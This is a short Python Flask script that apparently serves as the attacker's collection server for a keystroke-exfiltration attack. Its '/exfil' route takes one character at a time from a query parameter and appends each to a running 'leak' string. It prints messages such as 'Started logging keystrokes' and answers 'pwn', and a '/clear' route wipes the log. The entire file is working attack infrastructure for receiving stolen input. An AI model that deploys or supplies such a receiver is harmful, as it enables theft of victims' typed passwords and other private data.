from flask import Flask, request
from urllib.parse import unquote

app = Flask(__name__)

leak = ""

@app.route('/exfil')
def exfil():
    global leak
    char = unquote(request.args.get('c')) # in case of url encoded spaces and etc.
    
    if "_" in char:
        leak = char.replace('_', '') 
        print("[*] Started logging keystrokes ...")
        return 'started'            
    else:
        leak += char[-1]
        print(leak)
        
    return 'pwn'

@app.route('/clear')
def clear():
    global leak
    leak = ""
    
    print("[*] Removed current logs.")
    
    return 'cleared'

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337, debug=True)